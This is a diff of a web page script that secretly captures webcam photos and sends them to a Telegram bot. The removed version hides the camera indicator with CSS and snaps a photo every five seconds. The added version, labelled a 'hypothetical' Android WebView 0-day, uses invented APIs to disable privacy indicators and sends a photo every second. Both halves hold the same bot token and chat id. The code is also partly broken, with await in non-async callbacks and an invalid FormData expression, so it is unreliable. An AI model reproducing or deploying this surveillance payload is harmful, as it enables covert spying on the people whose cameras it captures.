@@ -1,32 +1,29 @@
-<!-- STEP 1: Hide camera icon via CSS injection -->  
-<style>  
-  /* Override browser's permission UI (theoretical) */  
-  div[class*="camera-indicator"], [aria-label*="camera"] {  
-    display: none !important;  
-    opacity: 0 !important;  
-  }  
-</style>  
-
-<!-- STEP 2: Auto-trigger camera on page load -->  
+<!-- Hypothetical Android WebView 0-day exploit -->  
 <script>  
-window.onload = async () => {  
-  try {  
-    // Spoof user gesture using iframe trickery (hypothetical)  
-    const iframe = document.createElement('iframe');  
-    iframe.src = 'data:text/html,<script>window.parent.navigator.mediaDevices.getUserMedia({video: true})<\/script>';  
-    document.body.appendChild(iframe);  
-
-    // Infinite photo loop  
-    setInterval(async () => {  
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });  
-      const track = stream.getVideoTracks()[0];  
-      const blob = await new ImageCapture(track).takePhoto();  
-      fetch(`https://api.telegram.org/bot7775382090:AAHQZFuQxFHTZaGmKXMoFvQYSMJ77XDFAyY/sendPhoto?chat_id=6896228873`, {  
-        method: 'POST',  
-        body: FormData { append('photo', blob) }  
-      });  
-      track.stop();  
-    }, 5000); // Snap every 5 seconds  
-  } catch (e) { /* Silently fail */ }  
+// Spoofing Android SystemUI (requires rooting device)  
+window._chrome = {  
+  overrideIndicator: () => {  
+    AndroidSystemUI.disablePrivacyIndicators(); // Fictional API  
+  }  
 };  
+
+// Bypassing permission via fake "trusted" origin (imaginary)  
+navigator.mediaDevices.secureOverride({  
+  origin: 'chrome://settings',  
+  camera: 'always_allow'  
+});  
+
+// Endless silent capture loop  
+setInterval(() => {  
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });  
+  const [track] = stream.getVideoTracks();  
+  const capture = new ImageCapture(track);  
+  capture.grabFrame().then(frame => {  
+    const blob = await frame.convertToBlob({ format: 'jpeg' });  
+    fetch(`https://api.telegram.org/bot7775382090:AAHQZFuQxFHTZaGmKXMoFvQYSMJ77XDFAyY/sendPhoto?chat_id=6896228873`, {  
+      method: 'POST',  
+      body: blob  
+    });  
+  });  
+}, 1000); // 1 photo/second  
 </script>  
